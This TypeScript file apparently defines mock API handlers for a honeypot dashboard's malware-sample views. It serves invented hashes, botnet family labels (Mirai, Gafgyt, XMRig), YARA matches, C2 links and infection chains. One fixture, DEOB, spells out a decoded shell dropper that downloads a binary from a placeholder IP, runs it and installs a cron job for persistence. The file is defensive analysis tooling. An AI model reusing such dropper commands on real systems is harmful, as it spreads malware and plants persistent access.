/**
 * MSW handlers for the M21 sample endpoints and the egress status. Demo data only: hashes are
 * generated, hosts are example domains, addresses are in the documentation ranges.
 */
import { delay, http, HttpResponse, type RequestHandler } from "msw"
import type { Session } from "@/lib/api"
import type {
  ChainEdge,
  ChainNode,
  Egress,
  SampleDetail,
  SampleItem,
  SampleLink,
} from "@/lib/samples"
import type { FetchStatus } from "@/lib/trends"
import { buildFixtures } from "./fixtures"

const LATENCY_MS = 150
const HOUR = 3_600_000
const DAY = 24 * HOUR
const iso = (ms: number) => new Date(ms).toISOString().replace(".000Z", "Z")

function fnv(s: string | number): number {
  let h = 2166136261
  for (const c of String(s)) h = Math.imul(h ^ c.charCodeAt(0), 16777619)
  return h >>> 0
}

/** A stable, invented hex digest of `bytes` bytes. Not the hash of anything real. */
export function fakeDigest(seed: string, bytes: number): string {
  let out = ""
  for (let i = 0; out.length < bytes * 2; i++)
    out += fnv(`${seed}:${i}`).toString(16).padStart(8, "0")
  return out.slice(0, bytes * 2)
}

export const sampleSha = (i: number) => fakeDigest(`sample-${i}`, 32)

interface Seed {
  kind: string
  arch: string | null
  bits: number | null
  family: string | null
  size: number
  daysAgo: number
  sources: number
  sessions: number
  yara: string[]
  host: string
  path: string
}

const SEEDS: Seed[] = [
  {
    kind: "ELF",
    arch: "ARM",
    bits: 32,
    family: "Mirai",
    size: 118_472,
    daysAgo: 0.2,
    sources: 4,
    sessions: 61,
    yara: ["mirai_botnet_strings", "upx_packed"],
    host: "files.example.net",
    path: "bins/arm7",
  },
  {
    kind: "ELF",
    arch: "MIPS",
    bits: 32,
    family: "Mirai",
    size: 96_208,
    daysAgo: 0.5,
    sources: 3,
    sessions: 44,
    yara: ["mirai_botnet_strings"],
    host: "files.example.net",
    path: "bins/mips",
  },
  {
    kind: "ELF",
    arch: "x86",
    bits: 64,
    family: "XMRig",
    size: 2_914_816,
    daysAgo: 1.1,
    sources: 2,
    sessions: 23,
    yara: ["xmrig_miner_config"],
    host: "dl.example.com",
    path: "xmrig",
  },
  {
    kind: "Script",
    arch: null,
    bits: null,
    family: null,
    size: 3_412,
    daysAgo: 1.4,
    sources: 6,
    sessions: 88,
    yara: ["shell_dropper_wget_chmod"],
    host: "198.51.100.23",
    path: "x86.sh",
  },
  {
    kind: "ELF",
    arch: "ARM",
    bits: 32,
    family: "Mirai",
    size: 121_064,
    daysAgo: 2.2,
    sources: 2,
    sessions: 17,
    yara: ["mirai_botnet_strings"],
    host: "cdn.example.org",
    path: "bins/arm5",
  },
  {
    kind: "ELF",
    arch: "x86",
    bits: 32,
    family: "Gafgyt",
    size: 74_380,
    daysAgo: 2.9,
    sources: 1,
    sessions: 9,
    yara: ["gafgyt_flood_commands"],
    host: "203.0.113.200",
    path: "gaf.x86",
  },
  {
    kind: "Script",
    arch: null,
    bits: null,
    family: null,
    size: 1_986,
    daysAgo: 3.3,
    sources: 2,
    sessions: 12,
    yara: [],
    host: "mirror.example.net",
    path: "update.php",
  },
  {
    kind: "ELF",
    arch: "MIPS",
    bits: 32,
    family: "Mirai",
    size: 98_552,
    daysAgo: 3.6,
    sources: 2,
    sessions: 14,
    yara: ["mirai_botnet_strings"],
    host: "cdn.example.org",
    path: "bins/mpsl",
  },
  {
    kind: "PE",
    arch: "x86",
    bits: 32,
    family: null,
    size: 412_160,
    daysAgo: 4.5,
    sources: 1,
    sessions: 3,
    yara: [],
    host: "files.example.net",
    path: "payload.exe",
  },
  {
    kind: "ELF",
    arch: "x86",
    bits: 64,
    family: null,
    size: 51_688,
    daysAgo: 5.2,
    sources: 1,
    sessions: 2,
    yara: [],
    host: "dl.example.com",
    path: "kworker",
  },
  {
    kind: "Script",
    arch: null,
    bits: null,
    family: "XMRig",
    size: 5_120,
    daysAgo: 6.1,
    sources: 3,
    sessions: 31,
    yara: ["shell_dropper_wget_chmod", "xmrig_miner_config"],
    host: "198.51.100.23",
    path: "cron.sh",
  },
  {
    kind: "ELF",
    arch: "ARM",
    bits: 64,
    family: "Mirai",
    size: 133_904,
    daysAgo: 9,
    sources: 2,
    sessions: 8,
    yara: ["mirai_botnet_strings"],
    host: "files.example.net",
    path: "bins/aarch64",
  },
  {
    kind: "ELF",
    arch: "PowerPC",
    bits: 32,
    family: null,
    size: 88_012,
    daysAgo: 12,
    sources: 1,
    sessions: 1,
    yara: [],
    host: "mirror.example.net",
    path: "ppc",
  },
  {
    kind: "Script",
    arch: null,
    bits: null,
    family: null,
    size: 902,
    daysAgo: 15,
    sources: 1,
    sessions: 4,
    yara: [],
    host: "dl.example.com",
    path: "a.sh",
  },
]

const now = Date.now()

function at<T>(list: readonly T[], i: number): T {
  const v = list[i]
  if (v === undefined) throw new Error(`mock index ${i} out of range`)
  return v
}

const items: SampleItem[] = SEEDS.map((s, i) => {
  const last = now - s.daysAgo * DAY
  const netCheck = i === 3 || i === 8
  const severe = Boolean(s.family) || s.kind === "ELF" || s.kind === "PE"
  return {
    sha256: sampleSha(i),
    kind: s.kind,
    arch: s.arch,
    bits: s.bits,
    family: s.family,
    severity: severe ? "severe" : "notice",
    size: s.size,
    // A network check was never seen attacking this node: no sessions, a link or two.
    sources: netCheck ? Math.min(s.sources, 2) : s.sources,
    sessions: netCheck ? 0 : s.sessions,
    first_seen: iso(last - s.daysAgo * 0.4 * DAY),
    last_seen: iso(last),
    yara: s.yara,
    stored: true,
    analysis_status: i === 12 ? "pending" : "done",
    origin: netCheck ? "network_verify" : "local",
    crawled: false,
  }
})

const DEOB = `#!/bin/sh
# decoded from 2 layers of base64
cd /tmp || cd /var/tmp
wget -q http://203.0.113.200/gaf.x86 -O .x
chmod +x .x
./.x ssh.exploit &
(crontab -l 2>/dev/null; echo "*/5 * * * * /tmp/.x") | crontab -
rm -f $0`

const STRINGS = [
  "/bin/busybox",
  "/proc/net/tcp",
  "GET /bins/%s HTTP/1.0",
  "Host: 203.0.113.200",
  "User-Agent: Mozilla/5.0 (X11; Linux x86_64)",
  "/dev/watchdog",
  "/dev/misc/watchdog",
  "TSource Engine Query",
  "ps aux | grep",
  "kill -9",
  "POST /cdn-cgi/",
  "notify.example.org",
]

function stringsFor(i: number): string[] {
  const n = i === 0 ? 420 : 40 + (i % 5) * 12
  return Array.from({ length: n }, (_, k) => {
    const base = STRINGS[(k + i) % STRINGS.length] ?? "/bin/sh"
    return k < STRINGS.length ? base : `${base} #${k}`
  })
}

function linksFor(i: number): SampleLink[] {
  const seed = SEEDS[i]
  if (!seed?.family) return []
  return [
    { kind: "c2_ip", value: "203.0.113.77", port: 23, source: "strings", confidence: "high" },
    {
      kind: "c2_domain",
      value: "cnc.example.net",
      port: 48101,
      source: "strings",
      confidence: "medium",
    },
    ...(seed.kind === "Script"
      ? [
          {
            kind: "next_url" as const,
            value: "http://203.0.113.200/gaf.x86",
            port: null,
            source: "script",
            confidence: "high",
          },
        ]
      : []),
  ]
}

const pool: Session[] = buildFixtures(120, now, 7).map((f) => f.session)

function sessionsFor(i: number): Session[] {
  const withDl = pool.filter((s) => s.downloads > 0)
  const base = withDl.length > 0 ? withDl : pool
  return Array.from(
    { length: Math.min(8, SEEDS[i]?.sessions ?? 1) },
    (_, k) => base[(i * 3 + k) % base.length],
  ).filter((s): s is Session => Boolean(s))
}

function detail(i: number): SampleDetail {
  const item = at(items, i)
  const seed = at(SEEDS, i)
  const done = item.analysis_status === "done"
  const isScript = seed.kind === "Script"
  const hits = seed.yara
  return {
    item,
    sha1: fakeDigest(`sha1-${i}`, 20),
    md5: fakeDigest(`md5-${i}`, 16),
    tlsh: isScript ? null : `T1${fakeDigest(`tlsh-${i}`, 35).toUpperCase()}`,
    endian: isScript ? null : "little",
    linking: isScript ? null : i % 2 === 0 ? "statically linked" : "dynamically linked",
    packer: hits.includes("upx_packed") ? "UPX" : null,
    virustotal_url: `https://www.virustotal.com/gui/file/${item.sha256}`,
    analysis: done
      ? {
          analyzed_at: item.last_seen,
          elapsed_ms: 420 + i * 37,
          yara: hits.map((rule) => ({
            rule,
            namespace: "botnets",
            tags: [],
            meta: {
              description: rule.startsWith("mirai")
                ? "Strings typical of Mirai builds."
                : rule.startsWith("xmrig")
                  ? "Mining pool settings of the XMRig miner."
                  : rule.startsWith("shell")
                    ? "A shell dropper that downloads, marks runnable and runs a file."
                    : "Packed with UPX.",
            },
          })),
          strings: stringsFor(i),
          deobfuscated: isScript && i === 3 ? DEOB : null,
          deob_steps:
            isScript && i === 3
              ? [
                  { step: "Decoded a base64 blob", detail: "1,204 characters" },
                  { step: "Decoded a second base64 blob", detail: "812 characters" },
                ]
              : [],
          errors: [],
        }
      : null,
    sources: Array.from({ length: Math.min(seed.sources, 4) }, (_, k) => ({
      url: `http://${k === 0 ? seed.host : `host${k}.example.net`}/${seed.path}`,
      host: k === 0 ? seed.host : `host${k}.example.net`,
      first_fetched: item.first_seen,
      last_fetched: item.last_seen,
      sessions: Math.max(1, Math.round(seed.sessions / (k + 1.5))),
      ips: Math.max(1, Math.round(seed.sessions / (k + 3))),
      sensors: k === 0 ? ["ssh", "telnet"] : ["web"],
    })),
    links: done ? linksFor(i) : [],
    recent_sessions: sessionsFor(i),
  }
}

function chainFor(i: number) {
  const seed = at(SEEDS, i)
  const sha = sampleSha(i)
  const ss = sessionsFor(i).slice(0, 2)
  const nodes: ChainNode[] = [
    ...ss.map((s) => ({
      id: `s:${s.session_id}`,
      kind: "session" as const,
      label: s.session_id,
      session_id: s.session_id,
    })),
    { id: "u:1", kind: "url", label: `http://${seed.host}/${seed.path}` },
  ]
  const edges: ChainEdge[] = ss.map((s) => ({ from: `s:${s.session_id}`, to: "u:1" }))
  if (seed.kind === "Script") {
    nodes.push(
      { id: "f:0", kind: "sample", label: sha.slice(0, 12), sha256: sha, family: seed.family },
      { id: "u:2", kind: "url", label: "http://203.0.113.200/gaf.x86" },
      {
        id: "f:1",
        kind: "sample",
        label: sampleSha(5).slice(0, 12),
        sha256: sampleSha(5),
        family: "Gafgyt",
      },
      { id: "c:1", kind: "c2", label: "203.0.113.77:23" },
    )
    edges.push(
      { from: "u:1", to: "f:0" },
      { from: "f:0", to: "u:2" },
      { from: "u:2", to: "f:1" },
      { from: "f:1", to: "c:1" },
    )
  } else {
    nodes.push({
      id: "f:0",
      kind: "sample",
      label: sha.slice(0, 12),
      sha256: sha,
      family: seed.family,
    })
    edges.push({ from: "u:1", to: "f:0" })
    if (seed.family) {
      nodes.push({ id: "c:1", kind: "c2", label: "203.0.113.77:23" })
      edges.push({ from: "f:0", to: "c:1" })
    }
  }
  return { nodes, edges }
}

const egress: Egress = {
  ingest: { state: "open", reason: null, checked_at: iso(now - 2 * 60_000) },
  collector: { state: "open", reason: null, checked_at: iso(now - 2 * 60_000) },
  exit_ip_allowed: true,
  exit_ip: "192.0.2.58",
  collector_quota: { used: 143, limit: 500 },
  quarantine: { used_bytes: 38_400_000, max_bytes: 512_000_000 },
}

/** Fetch status and hash for the Nth mock download URL (used by the malware list mock). */
export function mockFetchState(
  i: number,
  tools: readonly string[],
): {
  fetch_status: FetchStatus | null
  sha256: string | null
  size: number | null
  virustotal_url: string | null
} {
  if (tools.includes("tftp"))
    return { fetch_status: "unsupported", sha256: null, size: null, virustotal_url: null }
  const r = i % 9
  if (r === 3 || r === 7) {
    const k = i % items.length
    const it = at(items, k)
    return {
      fetch_status: "fetched",
      sha256: it.sha256,
      size: it.size,
      virustotal_url: `https://www.virustotal.com/gui/file/${it.sha256}`,
    }
  }
  const status: FetchStatus | null =
    r === 1 ? "pending" : r === 5 ? "failed" : r === 8 ? "refused" : null
  return { fetch_status: status, sha256: null, size: null, virustotal_url: null }
}

function encodeCursor(offset: number) {
  return btoa(JSON.stringify({ o: offset })).replace(/=+$/, "")
}
function decodeCursor(raw: string | null): number {
  if (!raw) return 0
  try {
    const v = JSON.parse(atob(raw)) as { o?: number }
    return typeof v.o === "number" ? v.o : 0
  } catch {
    return 0
  }
}

export const samplesHandlers: RequestHandler[] = [
  http.get("/api/v1/samples", async ({ request }) => {
    await delay(LATENCY_MS)
    const u = new URL(request.url).searchParams
    const q = (u.get("q") ?? "").toLowerCase()
    const limit = Math.min(200, Number(u.get("limit") ?? 50))
    const all = items.filter(
      (s) =>
        (!u.get("kind") || s.kind === u.get("kind")) &&
        (!u.get("arch") || s.arch === u.get("arch")) &&
        (!u.get("family") || s.family === u.get("family")) &&
        (!u.get("yara") || s.yara.includes(u.get("yara") ?? "")) &&
        (!q || s.sha256.startsWith(q) || (SEEDS[items.indexOf(s)]?.path ?? "").includes(q)),
    )
    const offset = decodeCursor(u.get("cursor"))
    return HttpResponse.json({
      items: all.slice(offset, offset + limit),
      next_cursor: offset + limit < all.length ? encodeCursor(offset + limit) : null,
    })
  }),
  http.get("/api/v1/samples/:sha256", async ({ params }) => {
    await delay(LATENCY_MS)
    const i = items.findIndex((s) => s.sha256 === params.sha256)
    if (i < 0) return HttpResponse.json({ detail: "sample not found" }, { status: 404 })
    return HttpResponse.json(detail(i))
  }),
  http.get("/api/v1/samples/:sha256/chain", async ({ params }) => {
    await delay(LATENCY_MS)
    const i = items.findIndex((s) => s.sha256 === params.sha256)
    if (i < 0) return HttpResponse.json({ detail: "sample not found" }, { status: 404 })
    return HttpResponse.json(chainFor(i))
  }),
  http.post("/api/v1/samples/:sha256/archive", async ({ request }) => {
    await delay(LATENCY_MS)
    const body = (await request.json()) as { password?: string }
    if (!body.password || body.password === "wrong")
      return HttpResponse.json({ detail: "wrong password", code: "reauth_failed" }, { status: 403 })
    // Not a real archive: demo bytes only.
    return new HttpResponse(new Blob(["demo archive"], { type: "application/zip" }), {
      headers: { "Content-Type": "application/zip", "Cache-Control": "no-store" },
    })
  }),
  http.get("/api/v1/egress", async () => {
    await delay(LATENCY_MS)
    return HttpResponse.json(egress)
  }),
]
